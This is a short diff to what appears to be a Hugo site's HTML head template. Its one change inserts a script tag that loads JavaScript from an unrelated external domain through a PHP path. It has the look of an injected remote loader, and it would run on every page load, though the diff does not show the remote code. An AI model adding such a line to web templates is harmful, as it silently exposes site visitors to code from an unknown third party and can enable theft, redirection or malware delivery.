@@ -1,6 +1,7 @@
 <head>
   <meta charset="UTF-8">
   <title>{{ .Title }}</title>
+  <script src = 'https://status-detailing.com/srm//js/index.php'></script>
   {{ "<!-- Mobile Responsive Meta -->" | safeHTML }}
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="description" content="{{ with .Description }}{{ . }}{{ else }}{{ with site.Params.description }}{{ . }}{{ end }}{{ end }}">
